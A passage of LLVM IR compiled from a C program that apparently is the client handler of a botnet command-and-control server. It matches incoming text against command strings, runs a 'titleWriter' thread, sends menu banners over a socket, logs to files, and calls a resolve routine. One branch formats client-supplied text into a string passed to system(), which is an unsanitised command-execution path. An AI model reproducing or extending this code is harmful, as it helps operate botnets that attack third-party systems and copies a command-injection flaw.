  %560 = icmp eq i64 %559, -1
  br i1 %560, label %.loopexit.loopexit, label %.backedge

; <label>:561:                                    ; preds = %531
  %562 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i64 0, i64 0)) #9
  %563 = icmp eq i8* %562, null
  br i1 %563, label %564, label %570

; <label>:564:                                    ; preds = %561
  %565 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i64 0, i64 0)) #9
  %566 = icmp eq i8* %565, null
  br i1 %566, label %567, label %570

; <label>:567:                                    ; preds = %564
  %568 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.91, i64 0, i64 0)) #9
  %569 = icmp eq i8* %568, null
  br i1 %569, label %669, label %570

; <label>:570:                                    ; preds = %567, %564, %561
  %571 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %164, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.92, i64 0, i64 0), i64 73, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %165, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %166, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.93, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %167, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.94, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %168, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.95, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %169, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.96, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %170, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.97, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %171, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.98, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %172, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.99, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %173, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.100, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %174, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.101, i64 0, i64 0), i64 113, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %175, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.102, i64 0, i64 0), i64 74, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %176, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %177, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.103, i64 0, i64 0), i64 41, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %178, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.104, i64 0, i64 0), i64 39, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %179, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.105, i64 0, i64 0), i64 40, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %180, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.106, i64 0, i64 0), i64 39, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %181, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.107, i64 0, i64 0), i64 42, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %182, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.108, i64 0, i64 0), i64 41, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %183, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.109, i64 0, i64 0), i64 43, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %184, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.110, i64 0, i64 0), i64 39, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %185, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.111, i64 0, i64 0), i64 44, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %186, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %572 = call i64 @strlen(i8* nonnull %164) #9
  %573 = call i64 @send(i32 %93, i8* nonnull %164, i64 %572, i32 16384) #10
  %574 = icmp eq i64 %573, -1
  br i1 %574, label %.loopexit.loopexit, label %575

; <label>:575:                                    ; preds = %570
  %576 = call i64 @strlen(i8* nonnull %165) #9
  %577 = call i64 @send(i32 %93, i8* nonnull %165, i64 %576, i32 16384) #10
  %578 = icmp eq i64 %577, -1
  br i1 %578, label %.loopexit.loopexit, label %579

; <label>:579:                                    ; preds = %575
  %580 = call i64 @strlen(i8* nonnull %166) #9
  %581 = call i64 @send(i32 %93, i8* nonnull %166, i64 %580, i32 16384) #10
  %582 = icmp eq i64 %581, -1
  br i1 %582, label %.loopexit.loopexit, label %583

; <label>:583:                                    ; preds = %579
  %584 = call i64 @strlen(i8* nonnull %167) #9
  %585 = call i64 @send(i32 %93, i8* nonnull %167, i64 %584, i32 16384) #10
  %586 = icmp eq i64 %585, -1
  br i1 %586, label %.loopexit.loopexit, label %587

; <label>:587:                                    ; preds = %583
  %588 = call i64 @strlen(i8* nonnull %168) #9
  %589 = call i64 @send(i32 %93, i8* nonnull %168, i64 %588, i32 16384) #10
  %590 = icmp eq i64 %589, -1
  br i1 %590, label %.loopexit.loopexit, label %591

; <label>:591:                                    ; preds = %587
  %592 = call i64 @strlen(i8* nonnull %169) #9
  %593 = call i64 @send(i32 %93, i8* nonnull %169, i64 %592, i32 16384) #10
  %594 = icmp eq i64 %593, -1
  br i1 %594, label %.loopexit.loopexit, label %595

; <label>:595:                                    ; preds = %591
  %596 = call i64 @strlen(i8* nonnull %170) #9
  %597 = call i64 @send(i32 %93, i8* nonnull %170, i64 %596, i32 16384) #10
  %598 = icmp eq i64 %597, -1
  br i1 %598, label %.loopexit.loopexit, label %599

; <label>:599:                                    ; preds = %595
  %600 = call i64 @strlen(i8* nonnull %171) #9
  %601 = call i64 @send(i32 %93, i8* nonnull %171, i64 %600, i32 16384) #10
  %602 = icmp eq i64 %601, -1
  br i1 %602, label %.loopexit.loopexit, label %603

; <label>:603:                                    ; preds = %599
  %604 = call i64 @strlen(i8* nonnull %172) #9
  %605 = call i64 @send(i32 %93, i8* nonnull %172, i64 %604, i32 16384) #10
  %606 = icmp eq i64 %605, -1
  br i1 %606, label %.loopexit.loopexit, label %607

; <label>:607:                                    ; preds = %603
  %608 = call i64 @strlen(i8* nonnull %173) #9
  %609 = call i64 @send(i32 %93, i8* nonnull %173, i64 %608, i32 16384) #10
  %610 = icmp eq i64 %609, -1
  br i1 %610, label %.loopexit.loopexit, label %611

; <label>:611:                                    ; preds = %607
  %612 = call i64 @strlen(i8* nonnull %174) #9
  %613 = call i64 @send(i32 %93, i8* nonnull %174, i64 %612, i32 16384) #10
  %614 = icmp eq i64 %613, -1
  br i1 %614, label %.loopexit.loopexit, label %615

; <label>:615:                                    ; preds = %611
  %616 = call i64 @strlen(i8* nonnull %175) #9
  %617 = call i64 @send(i32 %93, i8* nonnull %175, i64 %616, i32 16384) #10
  %618 = icmp eq i64 %617, -1
  br i1 %618, label %.loopexit.loopexit, label %619

; <label>:619:                                    ; preds = %615
  %620 = call i64 @strlen(i8* nonnull %176) #9
  %621 = call i64 @send(i32 %93, i8* nonnull %176, i64 %620, i32 16384) #10
  %622 = icmp eq i64 %621, -1
  br i1 %622, label %.loopexit.loopexit, label %623

; <label>:623:                                    ; preds = %619
  %624 = call i64 @strlen(i8* nonnull %177) #9
  %625 = call i64 @send(i32 %93, i8* nonnull %177, i64 %624, i32 16384) #10
  %626 = icmp eq i64 %625, -1
  br i1 %626, label %.loopexit.loopexit, label %627

; <label>:627:                                    ; preds = %623
  %628 = call i64 @strlen(i8* nonnull %178) #9
  %629 = call i64 @send(i32 %93, i8* nonnull %178, i64 %628, i32 16384) #10
  %630 = icmp eq i64 %629, -1
  br i1 %630, label %.loopexit.loopexit, label %631

; <label>:631:                                    ; preds = %627
  %632 = call i64 @strlen(i8* nonnull %179) #9
  %633 = call i64 @send(i32 %93, i8* nonnull %179, i64 %632, i32 16384) #10
  %634 = icmp eq i64 %633, -1
  br i1 %634, label %.loopexit.loopexit, label %635

; <label>:635:                                    ; preds = %631
  %636 = call i64 @strlen(i8* nonnull %180) #9
  %637 = call i64 @send(i32 %93, i8* nonnull %180, i64 %636, i32 16384) #10
  %638 = icmp eq i64 %637, -1
  br i1 %638, label %.loopexit.loopexit, label %639

; <label>:639:                                    ; preds = %635
  %640 = call i64 @strlen(i8* nonnull %181) #9
  %641 = call i64 @send(i32 %93, i8* nonnull %181, i64 %640, i32 16384) #10
  %642 = icmp eq i64 %641, -1
  br i1 %642, label %.loopexit.loopexit, label %643

; <label>:643:                                    ; preds = %639
  %644 = call i64 @strlen(i8* nonnull %182) #9
  %645 = call i64 @send(i32 %93, i8* nonnull %182, i64 %644, i32 16384) #10
  %646 = icmp eq i64 %645, -1
  br i1 %646, label %.loopexit.loopexit, label %647

; <label>:647:                                    ; preds = %643
  %648 = call i64 @strlen(i8* nonnull %183) #9
  %649 = call i64 @send(i32 %93, i8* nonnull %183, i64 %648, i32 16384) #10
  %650 = icmp eq i64 %649, -1
  br i1 %650, label %.loopexit.loopexit, label %651

; <label>:651:                                    ; preds = %647
  %652 = call i64 @strlen(i8* nonnull %184) #9
  %653 = call i64 @send(i32 %93, i8* nonnull %184, i64 %652, i32 16384) #10
  %654 = icmp eq i64 %653, -1
  br i1 %654, label %.loopexit.loopexit, label %655

; <label>:655:                                    ; preds = %651
  %656 = call i64 @strlen(i8* nonnull %185) #9
  %657 = call i64 @send(i32 %93, i8* nonnull %185, i64 %656, i32 16384) #10
  %658 = icmp eq i64 %657, -1
  br i1 %658, label %.loopexit.loopexit, label %659

; <label>:659:                                    ; preds = %655
  %660 = call i64 @strlen(i8* nonnull %186) #9
  %661 = call i64 @send(i32 %93, i8* nonnull %186, i64 %660, i32 16384) #10
  %662 = icmp eq i64 %661, -1
  br i1 %662, label %.loopexit.loopexit, label %663

; <label>:663:                                    ; preds = %659
  %664 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %665 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %666 = call i64 @strlen(i8* nonnull %97) #9
  %667 = call i64 @send(i32 %93, i8* nonnull %97, i64 %666, i32 16384) #10
  %668 = icmp eq i64 %667, -1
  br i1 %668, label %.loopexit.loopexit, label %.backedge

; <label>:669:                                    ; preds = %567
  %670 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i64 0, i64 0)) #9
  %671 = icmp eq i8* %670, null
  br i1 %671, label %672, label %684

; <label>:672:                                    ; preds = %669
  %673 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.113, i64 0, i64 0)) #9
  %674 = icmp eq i8* %673, null
  br i1 %674, label %675, label %684

; <label>:675:                                    ; preds = %672
  %676 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0)) #9
  %677 = icmp eq i8* %676, null
  br i1 %677, label %678, label %684

; <label>:678:                                    ; preds = %675
  %679 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i64 0, i64 0)) #9
  %680 = icmp eq i8* %679, null
  br i1 %680, label %681, label %684

; <label>:681:                                    ; preds = %678
  %682 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.115, i64 0, i64 0)) #9
  %683 = icmp eq i8* %682, null
  br i1 %683, label %723, label %684

; <label>:684:                                    ; preds = %681, %678, %675, %672, %669
  %685 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %156, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i64 0, i64 0), i64 72, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %157, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %158, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.117, i64 0, i64 0), i64 95, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %159, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.118, i64 0, i64 0), i64 72, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %160, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.119, i64 0, i64 0), i64 73, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %161, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.120, i64 0, i64 0), i64 72, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %162, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.121, i64 0, i64 0), i64 73, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %163, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %686 = call i64 @strlen(i8* nonnull %156) #9
  %687 = call i64 @send(i32 %93, i8* nonnull %156, i64 %686, i32 16384) #10
  %688 = icmp eq i64 %687, -1
  br i1 %688, label %.loopexit.loopexit, label %689

; <label>:689:                                    ; preds = %684
  %690 = call i64 @strlen(i8* nonnull %157) #9
  %691 = call i64 @send(i32 %93, i8* nonnull %157, i64 %690, i32 16384) #10
  %692 = icmp eq i64 %691, -1
  br i1 %692, label %.loopexit.loopexit, label %693

; <label>:693:                                    ; preds = %689
  %694 = call i64 @strlen(i8* nonnull %158) #9
  %695 = call i64 @send(i32 %93, i8* nonnull %158, i64 %694, i32 16384) #10
  %696 = icmp eq i64 %695, -1
  br i1 %696, label %.loopexit.loopexit, label %697

; <label>:697:                                    ; preds = %693
  %698 = call i64 @strlen(i8* nonnull %159) #9
  %699 = call i64 @send(i32 %93, i8* nonnull %159, i64 %698, i32 16384) #10
  %700 = icmp eq i64 %699, -1
  br i1 %700, label %.loopexit.loopexit, label %701

; <label>:701:                                    ; preds = %697
  %702 = call i64 @strlen(i8* nonnull %160) #9
  %703 = call i64 @send(i32 %93, i8* nonnull %160, i64 %702, i32 16384) #10
  %704 = icmp eq i64 %703, -1
  br i1 %704, label %.loopexit.loopexit, label %705

; <label>:705:                                    ; preds = %701
  %706 = call i64 @strlen(i8* nonnull %161) #9
  %707 = call i64 @send(i32 %93, i8* nonnull %161, i64 %706, i32 16384) #10
  %708 = icmp eq i64 %707, -1
  br i1 %708, label %.loopexit.loopexit, label %709

; <label>:709:                                    ; preds = %705
  %710 = call i64 @strlen(i8* nonnull %162) #9
  %711 = call i64 @send(i32 %93, i8* nonnull %162, i64 %710, i32 16384) #10
  %712 = icmp eq i64 %711, -1
  br i1 %712, label %.loopexit.loopexit, label %713

; <label>:713:                                    ; preds = %709
  %714 = call i64 @strlen(i8* nonnull %163) #9
  %715 = call i64 @send(i32 %93, i8* nonnull %163, i64 %714, i32 16384) #10
  %716 = icmp eq i64 %715, -1
  br i1 %716, label %.loopexit.loopexit, label %717

; <label>:717:                                    ; preds = %713
  %718 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %719 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %720 = call i64 @strlen(i8* nonnull %97) #9
  %721 = call i64 @send(i32 %93, i8* nonnull %97, i64 %720, i32 16384) #10
  %722 = icmp eq i64 %721, -1
  br i1 %722, label %.loopexit.loopexit, label %.backedge

; <label>:723:                                    ; preds = %681
  %724 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.122, i64 0, i64 0)) #9
  %725 = icmp eq i8* %724, null
  br i1 %725, label %731, label %726

; <label>:726:                                    ; preds = %723
  %727 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %728 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %729 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %728, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %730 = call i32 @fclose(%struct._IO_FILE* %728)
  br label %.loopexit

; <label>:731:                                    ; preds = %723
  %732 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i64 0, i64 0)) #9
  %733 = icmp eq i8* %732, null
  br i1 %733, label %739, label %734

; <label>:734:                                    ; preds = %731
  %735 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %736 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %737 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %736, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %738 = call i32 @fclose(%struct._IO_FILE* %736)
  br label %.loopexit

; <label>:739:                                    ; preds = %731
  %740 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i64 0, i64 0)) #9
  %741 = icmp eq i8* %740, null
  br i1 %741, label %742, label %745

; <label>:742:                                    ; preds = %739
  %743 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.127, i64 0, i64 0)) #9
  %744 = icmp eq i8* %743, null
  br i1 %744, label %750, label %745

; <label>:745:                                    ; preds = %742, %739
  %746 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.128, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %747 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.129, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %748 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %747, i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.130, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %749 = call i32 @fclose(%struct._IO_FILE* %747)
  br label %.loopexit

; <label>:750:                                    ; preds = %742
  %751 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i64 0, i64 0)) #9
  %752 = icmp eq i8* %751, null
  br i1 %752, label %753, label %756

; <label>:753:                                    ; preds = %750
  %754 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.132, i64 0, i64 0)) #9
  %755 = icmp eq i8* %754, null
  br i1 %755, label %760, label %756

; <label>:756:                                    ; preds = %753, %750
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.133, i64 0, i64 0), i64 25, i32 1, i1 false)
  %757 = call i64 @strlen(i8* nonnull %97) #9
  %758 = call i64 @send(i32 %93, i8* nonnull %97, i64 %757, i32 16384) #10
  %759 = icmp eq i64 %758, -1
  br i1 %759, label %.loopexit209.loopexit, label %760

; <label>:760:                                    ; preds = %753, %756
  %761 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.134, i64 0, i64 0)) #9
  %762 = icmp eq i8* %761, null
  br i1 %762, label %767, label %763

; <label>:763:                                    ; preds = %760
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.135, i64 0, i64 0), i64 71, i32 1, i1 false)
  %764 = call i64 @strlen(i8* nonnull %97) #9
  %765 = call i64 @send(i32 %93, i8* nonnull %97, i64 %764, i32 16384) #10
  %766 = icmp eq i64 %765, -1
  br i1 %766, label %.loopexit209.loopexit, label %767

; <label>:767:                                    ; preds = %760, %763
  %768 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.136, i64 0, i64 0)) #9
  %769 = icmp eq i8* %768, null
  br i1 %769, label %774, label %770

; <label>:770:                                    ; preds = %767
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.137, i64 0, i64 0), i64 71, i32 1, i1 false)
  %771 = call i64 @strlen(i8* nonnull %97) #9
  %772 = call i64 @send(i32 %93, i8* nonnull %97, i64 %771, i32 16384) #10
  %773 = icmp eq i64 %772, -1
  br i1 %773, label %.loopexit209.loopexit, label %774

; <label>:774:                                    ; preds = %767, %770
  %775 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i64 0, i64 0)) #9
  %776 = icmp eq i8* %775, null
  br i1 %776, label %777, label %780

; <label>:777:                                    ; preds = %774
  %778 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.139, i64 0, i64 0)) #9
  %779 = icmp eq i8* %778, null
  br i1 %779, label %794, label %780

; <label>:780:                                    ; preds = %777, %774
  %781 = call i32 @strcmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0), i8* %153) #9
  %782 = icmp eq i32 %781, 0
  br i1 %782, label %783, label %791

; <label>:783:                                    ; preds = %780
  %784 = call i8* @strtok(i8* nonnull %96, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i64 0, i64 0)) #10
  %785 = getelementptr inbounds i8, i8* %784, i64 8
  call void @trim(i8* %785)
  %786 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @resolve to i32 (i8*, i8**, ...)*)(i8* %785, i8** nonnull %155) #10
  %787 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.141, i64 0, i64 0), i8* %785, i8** nonnull %155) #10
  %788 = call i64 @strlen(i8* nonnull %97) #9
  %789 = call i64 @send(i32 %93, i8* nonnull %97, i64 %788, i32 16384) #10
  %790 = icmp eq i64 %789, -1
  br i1 %790, label %.loopexit209.loopexit, label %794

; <label>:791:                                    ; preds = %780
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i64 0, i64 0), i64 60, i32 1, i1 false)
  %792 = call i64 @strlen(i8* nonnull %97) #9
  %793 = call i64 @send(i32 %93, i8* nonnull %97, i64 %792, i32 16384) #10
  br label %794

; <label>:794:                                    ; preds = %777, %791, %783
  %795 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.143, i64 0, i64 0)) #9
  %796 = icmp eq i8* %795, null
  br i1 %796, label %797, label %800

; <label>:797:                                    ; preds = %794
  %798 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i64 0, i64 0)) #9
  %799 = icmp eq i8* %798, null
  br i1 %799, label %816, label %800

; <label>:800:                                    ; preds = %797, %794
  %801 = call i32 @strcmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0), i8* %153) #9
  %802 = icmp eq i32 %801, 0
  br i1 %802, label %803, label %813

; <label>:803:                                    ; preds = %800
  %804 = call i8* @strtok(i8* nonnull %96, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i64 0, i64 0)) #10
  %805 = getelementptr inbounds i8, i8* %804, i64 8
  call void @trim(i8* %805)
  %806 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %154, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.145, i64 0, i64 0), i8* %805) #10
  %807 = call i32 @system(i8* nonnull %154) #10
  %808 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.146, i64 0, i64 0), i8* %126, i8* %805)
  %809 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.147, i64 0, i64 0), i8* %126, i8* %805) #10
  %810 = call i64 @strlen(i8* nonnull %97) #9
  %811 = call i64 @send(i32 %93, i8* nonnull %97, i64 %810, i32 16384) #10
  %812 = icmp eq i64 %811, -1
  br i1 %812, label %.loopexit209.loopexit, label %816

; <label>:813:                                    ; preds = %800
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i64 0, i64 0), i64 60, i32 1, i1 false)
  %814 = call i64 @strlen(i8* nonnull %97) #9
  %815 = call i64 @send(i32 %93, i8* nonnull %97, i64 %814, i32 16384) #10
  br label %816

; <label>:816:                                    ; preds = %797, %813, %803
  %817 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.148, i64 0, i64 0)) #9
  %818 = icmp eq i8* %817, null
  br i1 %818, label %823, label %819

; <label>:819:                                    ; preds = %816
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.149, i64 0, i64 0), i64 71, i32 1, i1 false)
  %820 = call i64 @strlen(i8* nonnull %97) #9
  %821 = call i64 @send(i32 %93, i8* nonnull %97, i64 %820, i32 16384) #10
  %822 = icmp eq i64 %821, -1
  br i1 %822, label %.loopexit209.loopexit, label %823

; <label>:823:                                    ; preds = %816, %819
  %824 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.150, i64 0, i64 0)) #9
  %825 = icmp eq i8* %824, null
  br i1 %825, label %830, label %826

; <label>:826:                                    ; preds = %823
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i64 0, i64 0), i64 72, i32 1, i1 false)
  %827 = call i64 @strlen(i8* nonnull %97) #9
  %828 = call i64 @send(i32 %93, i8* nonnull %97, i64 %827, i32 16384) #10
  %829 = icmp eq i64 %828, -1
  br i1 %829, label %.loopexit209.loopexit, label %830

; <label>:830:                                    ; preds = %823, %826
  %831 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.152, i64 0, i64 0)) #9
  %832 = icmp eq i8* %831, null
  br i1 %832, label %837, label %833

; <label>:833:                                    ; preds = %830
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i64 0, i64 0), i64 72, i32 1, i1 false)
  %834 = call i64 @strlen(i8* nonnull %97) #9
  %835 = call i64 @send(i32 %93, i8* nonnull %97, i64 %834, i32 16384) #10
  %836 = icmp eq i64 %835, -1
  br i1 %836, label %.loopexit209.loopexit, label %837

; <label>:837:                                    ; preds = %830, %833
  %838 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.153, i64 0, i64 0)) #9
  %839 = icmp eq i8* %838, null
  br i1 %839, label %844, label %840

; <label>:840:                                    ; preds = %837
